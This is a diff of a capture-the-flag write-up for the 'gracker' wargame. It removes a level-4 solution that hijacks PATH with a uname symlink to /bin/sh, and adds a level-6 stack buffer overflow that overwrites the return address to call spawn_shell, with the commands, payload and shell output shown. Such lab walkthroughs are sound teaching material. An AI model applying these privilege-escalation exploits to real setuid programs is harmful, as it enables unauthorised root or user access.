@@ -1,30 +1,44 @@
-In this level you had to exploit the fact, that if no absolute path is specified,
-the system searches in the $PATH locations for it. Because the setuid binary
-didn't use absoliute paths, it was possible to change the environment $PATH
-variable. One of the first commands executed is `uname`. So we use a symlink
-called uname to `/bin/sh`.
+I hope you understood how functions work in assembler.
+A summary is, that upon `call` the current EIP is pushed on the stack, and upon `ret` this value is popped from the stack and jumped to.
+With the buffer overflow you can overwrite this address on the stack and redirect code execution when the function wants to return.
 
-    ln -s /bin/sh uname
+Here is a solution without `gdb`:
 
-If we now set $PATH only to the current working directory "." the system will
-search for the `uname` program and will only find the symlink. So it will execute
-the shell for us.
+    level6@gracker:/matrix/level6$ objdump -t level6 | grep shell
+    0804858b g     F .text  00000060              spawn_shell
 
-    level4@gracker:/tmp/level4$ echo $PATH
-    /sbin/:/usr/local/bin:/usr/bin:/bin:/usr/games
+0x804858b is the address of the spawn_shell function. Because of the endianess [0] we have to reverse the bytes:
+0x804858b -> \x8b\x85\x04\x08
+Thanks to the output of the return address we can verify that we entered the correct address:
 
-    level4@gracker:/tmp/level4$ env PATH=. /matrix/level4/level4
-    Zero Cool - Linux Information Gathering Tool v1.2
+    level6@gracker:/matrix/level6$ ./level6 `echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABCDE`
+    Hello, I'm the MCP (Master Control Program). I'm here to protect the TRON system.
+    What are you doing here? Are you a user or a program?
+    Where did you come from? Proof your identity:
+    Return to: 0x45444342
+    zsh: segmentation fault  ./level6 `echo AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABCDE`
 
-    [*] Get system information:
-    $ PATH=/sbin/:/usr/local/bin:/usr/bin:/bin:/usr/games
+A nice tool to analyse what the binary does, and to check if the function is called:
+
+    level6@gracker:/matrix/level6$ strace ./level6 `echo "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x8b\x85\x04\x08"`
+    [... snip ...]
+    write(1, "Welcome to Arjia City!\n", 23Welcome to Arjia City!
+    ) = 23
+    getegid32()                             = 0
+    geteuid32()                             = 1007
+    setresgid32(0, 0, 0)                    = 0
+    setresuid32(1007, 1007, 1007)           = 0
+    [...]
+
+Which fits the functions called in `spawn_shell`. And when we run it without the strace we also see the nice shell:
+
+    ./level6 `echo "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x8b\x85\x04\x08"`
+    Hello, I'm the MCP (Master Control Program). I'm here to protect the TRON system.
+    What are you doing here? Are you a user or a program?
+    Where did you come from? Proof your identity:
+    Return to: 0x804858b
+    Welcome to Arjia City!
     $ id
-    uid=1005(level5) gid=1004(level4) groups=1004(level4)
+    uid=1007(level7) gid=1006(level6) groups=1006(level6)
 
-Because the $PATH is now screwed, we have to reset it back to the original value,
-otherwise no other commands will work.
-
-This kind of exploit is or was a real issue. Not only for linux commandline $PATH,
-but also for DLLs in Windows or Dylib (dynamic libraries) in OSX.
-Read this paper for more details:
-https://www.virusbtn.com/virusbulletin/archive/2015/03/vb201503-dylib-hijacking
+[0] https://en.wikipedia.org/wiki/Endianness
